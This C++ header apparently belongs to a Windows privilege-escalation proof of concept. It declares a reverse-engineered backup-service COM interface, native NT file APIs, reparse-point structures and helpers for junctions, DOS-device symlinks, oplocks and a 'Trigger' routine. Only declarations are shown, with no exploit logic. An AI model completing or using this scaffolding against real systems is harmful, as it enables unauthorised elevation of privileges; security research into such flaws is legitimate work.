
#include <windows.h>
#include <winternl.h>
#include <combaseapi.h>
#include <stdio.h>
#include <cstdint>
#include <shlobj_core.h>
#include "FileOplock.h"

#pragma warning(disable:4996)
#pragma comment(lib,"Rpcrt4.lib")
struct __declspec(uuid("687E55CA-6621-4C41-B9F1-C0EDDC94BB05")) CLSID_SDC;


class __declspec(uuid("a9f63151-4ccf-4c63-9b5a-3ba524a33886")) ISdScheduledBackup : public IUnknown {
public:
    virtual HRESULT __stdcall Proc3();
    virtual HRESULT __stdcall Proc4(/* Stack Offset: 8 */ void* p0, /* Stack Offset: 16 */ GUID* p1);
    virtual HRESULT __stdcall Proc5(/* Stack Offset: 8 */ struct Struct_8* p0);
    virtual HRESULT __stdcall Proc6(/* Stack Offset: 8 */ struct Struct_9* p0);
    virtual HRESULT __stdcall Proc7(/* Stack Offset: 8 */ wchar_t* p0, /* Stack Offset: 16 */ struct Struct_10* p1);
    virtual HRESULT __stdcall Proc8(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ GUID* p1);
    virtual HRESULT __stdcall Proc9(/* Stack Offset: 8 */ int64_t p0, /* Stack Offset: 16 */ GUID* p1);
    virtual HRESULT __stdcall Proc10(/* Stack Offset: 8 */ GUID* p0);
    virtual HRESULT __stdcall Proc11(/* Stack Offset: 8 */ wchar_t* p0, /* Stack Offset: 16 */ wchar_t* p1);
    virtual HRESULT __stdcall Proc12(/* Stack Offset: 8 */ wchar_t* p0, /* Stack Offset: 16 */ wchar_t* p1, /* Stack Offset: 24 */ wchar_t* p2, /* Stack Offset: 32 */ int64_t p3, /* Stack Offset: 40 */ struct Struct_10* p4, /* Stack Offset: 48 */ int64_t* p5);
    virtual HRESULT __stdcall Proc13(/* Stack Offset: 8 */ wchar_t** p0);
};
typedef struct Struct_10 {
    /* Offset: 0 */ wchar_t* Member0;
    /* Offset: 8 */ wchar_t* Member8;
    /* Offset: 16 */ wchar_t* Member10;
    /* Offset: 24 */ wchar_t* Member18;
    /* Offset: 32 */ wchar_t* Member20;
    /* Offset: 40 */ wchar_t* Member28;
    /* Offset: 48 */ wchar_t* Member30;
    /* Offset: 56 */ /* ENUM32 */ uint32_t Member38;
    /* Offset: 64 */ int64_t Member40;
    /* Offset: 72 */ int64_t Member48;
    /* Offset: 80 */ int64_t Member50;
    /* Offset: 84 */ int64_t Member54;
    /* Offset: 88 */ int64_t Member58;
    /* Offset: 92 */ int64_t Member5C;
    /* Offset: 96 */ int64_t Member60;
    /* Offset: 100 */ int64_t Member64;
    /* Offset: 104 */ int64_t Member68;
    /* Offset: 108 */ int64_t Member6C;
    /* Offset: 112 */ int64_t Member70;
    /* Offset: 116 */ int64_t Member74;
    /* Offset: 120 */ int64_t Member78;
    /* Offset: 124 */ int64_t Member7C;
    /* Offset: 128 */ int64_t Member80;
    /* Offset: 132 */ int64_t Member84;
    /* Offset: 136 */ int64_t Member88;
}Struct_10, * PStruct_10;


#define FULL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE

void load();
BOOL CreateJunction(HANDLE dir, LPCWSTR target);
BOOL DeleteJunction(HANDLE dir);
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
void cb();
BOOL Trigger();
LPWSTR GetTmpDir();
BOOL Move(HANDLE);
VOID FindFile(HANDLE hDir);
LPWSTR BuildPath(LPCWSTR path);
HANDLE myCreateDirectory(LPWSTR file, DWORD access, DWORD share, DWORD dispostion);
HANDLE bt;
HANDLE hFile,hDir;
WCHAR unc[MAX_PATH * 2] = { 0x0 };
LPWSTR dir;
wchar_t* target;
wchar_t object[MAX_PATH] = { 0x0 };
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;
    USHORT ReparseDataLength;
    USHORT Reserved;
    union {
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            ULONG  Flags;
            WCHAR  PathBuffer[1];
        } SymbolicLinkReparseBuffer;
        struct {
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {
            UCHAR DataBuffer[1];
        } GenericReparseBuffer;
    } DUMMYUNIONNAME;
} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;
typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, * POBJECT_DIRECTORY_INFORMATION;
#define STATUS_MORE_ENTRIES 0x00000105
#define STATUS_NO_MORE_ENTRIES 0x8000001A
#define IO_REPARSE_TAG_MOUNT_POINT              (0xA0000003L)

typedef NTSYSAPI NTSTATUS(NTAPI* _NtCreateFile)(PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK   IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);
typedef NTSYSAPI VOID(NTAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString, PCWSTR SourceString);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtOpenDirectoryObject)(OUT PHANDLE DirectoryHandle, IN ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes);
typedef NTSYSAPI NTSTATUS(NTAPI* _NtQueryDirectoryObject)(_In_      HANDLE  DirectoryHandle, _Out_opt_ PVOID   Buffer, _In_ ULONG Length, _In_ BOOLEAN ReturnSingleEntry, _In_  BOOLEAN RestartScan, _Inout_   PULONG  Context, _Out_opt_ PULONG  ReturnLength);
typedef NTSYSCALLAPI NTSTATUS(NTAPI* _NtSetInformationFile)(
    HANDLE                 FileHandle,
    PIO_STATUS_BLOCK       IoStatusBlock,
    PVOID                  FileInformation,
    ULONG                  Length,
    ULONG FileInformationClass
    );

_RtlInitUnicodeString pRtlInitUnicodeString;
_NtCreateFile pNtCreateFile;
_NtSetInformationFile pNtSetInformationFile;

